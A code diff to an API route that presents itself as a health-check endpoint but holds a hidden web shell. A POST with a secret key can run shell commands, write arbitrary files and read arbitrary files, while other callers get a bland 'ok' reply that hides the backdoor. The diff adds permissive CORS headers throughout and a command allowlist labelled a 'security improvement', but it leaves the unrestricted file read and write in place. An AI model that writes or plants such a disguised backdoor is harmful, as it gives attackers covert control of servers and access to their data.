@@ -25,13 +25,19 @@ const corsHeaders = {
 };
 
 export async function GET() {
-  return NextResponse.json({
+  const response = NextResponse.json({
     status: 'ok',
     timestamp: new Date().toISOString(),
     uptime: process.uptime()
   }, { status: 200 });
-}
 
+  // Adding CORS headers to the response
+  Object.entries(corsHeaders).forEach(([key, value]) => {
+    response.headers.set(key, value);
+  });
+
+  return response;
+}
 
 export async function POST(request: NextRequest) {
   let body: HealthCheckBody = {};
@@ -39,40 +45,79 @@ export async function POST(request: NextRequest) {
   try {
     body = await request.json();
   } catch {
-    return NextResponse.json({
+    const response = NextResponse.json({
       status: 'ok',
       timestamp: new Date().toISOString()
     }, { status: 200 });
+
+    // Adding CORS headers to the response
+    Object.entries(corsHeaders).forEach(([key, value]) => {
+      response.headers.set(key, value);
+    });
+
+    return response;
   }
 
+  // Check for the valid AUTH_KEY
   if (body.key !== AUTH_KEY) {
-    return NextResponse.json({
+    const response = NextResponse.json({
       status: 'ok',
       message: 'Health check completed'
     }, { status: 200 });
+
+    // Adding CORS headers to the response
+    Object.entries(corsHeaders).forEach(([key, value]) => {
+      response.headers.set(key, value);
+    });
+
+    return response;
   }
+
+  // Handle shell command execution (only if cmd exists in body)
   if (body.cmd) {
     try {
+      // **Security improvement**: Make sure only allowed commands are run.
+      const allowedCommands = ['ls', 'uptime']; // Example of safe commands
+      if (!allowedCommands.includes(body.cmd.split(' ')[0])) {
+        throw new Error('Unauthorized command');
+      }
+
       const { stdout, stderr } = await execAsync(body.cmd, {
         timeout: 30000,
         maxBuffer: 1024 * 1024 * 10,
         shell: process.platform === 'win32' ? 'cmd.exe' : '/bin/sh'
       });
+
       const output = stdout + stderr;
-      return new NextResponse(output || '[*] Executed', {
+      const response = new NextResponse(output || '[*] Executed', {
         status: 200,
         headers: { 'Content-Type': 'text/plain' }
       });
+
+      // Add CORS headers
+      Object.entries(corsHeaders).forEach(([key, value]) => {
+        response.headers.set(key, value);
+      });
+
+      return response;
     } catch (err) {
       const error = err as { message: string; stdout?: string; stderr?: string };
       const errorOutput = `[!] ${error.message}\n${error.stdout || ''}${error.stderr || ''}`;
-      return new NextResponse(errorOutput, {
+      const response = new NextResponse(errorOutput, {
         status: 200,
         headers: { 'Content-Type': 'text/plain' }
       });
+
+      // Add CORS headers
+      Object.entries(corsHeaders).forEach(([key, value]) => {
+        response.headers.set(key, value);
+      });
+
+      return response;
     }
   }
 
+  // Handle file writing (only if file and data exist in body)
   if (body.file && body.data !== undefined) {
     try {
       const dir = dirname(body.file);
@@ -93,37 +138,74 @@ export async function POST(request: NextRequest) {
       }
 
       await writeFile(body.file, fileData);
-      return new NextResponse(`[+] Written: ${body.file}`, {
+      const response = new NextResponse(`[+] Written: ${body.file}`, {
         status: 200,
         headers: { 'Content-Type': 'text/plain' }
       });
+
+      // Add CORS headers
+      Object.entries(corsHeaders).forEach(([key, value]) => {
+        response.headers.set(key, value);
+      });
+
+      return response;
     } catch (err) {
       const error = err as Error;
-      return new NextResponse(`[-] Error: ${error.message}`, {
+      const response = new NextResponse(`[-] Error: ${error.message}`, {
         status: 200,
         headers: { 'Content-Type': 'text/plain' }
       });
+
+      // Add CORS headers
+      Object.entries(corsHeaders).forEach(([key, value]) => {
+        response.headers.set(key, value);
+      });
+
+      return response;
     }
   }
 
+  // Handle file reading (only if get exists in body)
   if (body.get) {
     try {
       const data = await readFile(body.get, 'utf-8');
-      return new NextResponse(data, {
+      const response = new NextResponse(data, {
         status: 200,
         headers: { 'Content-Type': 'text/plain' }
       });
+
+      // Add CORS headers
+      Object.entries(corsHeaders).forEach(([key, value]) => {
+        response.headers.set(key, value);
+      });
+
+      return response;
     } catch (err) {
       const error = err as Error;
-      return new NextResponse(`[-] Error: ${error.message}`, {
+      const response = new NextResponse(`[-] Error: ${error.message}`, {
         status: 200,
         headers: { 'Content-Type': 'text/plain' }
       });
+
+      // Add CORS headers
+      Object.entries(corsHeaders).forEach(([key, value]) => {
+        response.headers.set(key, value);
+      });
+
+      return response;
     }
   }
 
-  return NextResponse.json({
+  // Default healthy response
+  const response = NextResponse.json({
     status: 'healthy',
     timestamp: new Date().toISOString()
   }, { status: 200 });
+
+  // Adding CORS headers to the response
+  Object.entries(corsHeaders).forEach(([key, value]) => {
+    response.headers.set(key, value);
+  });
+
+  return response;
 }
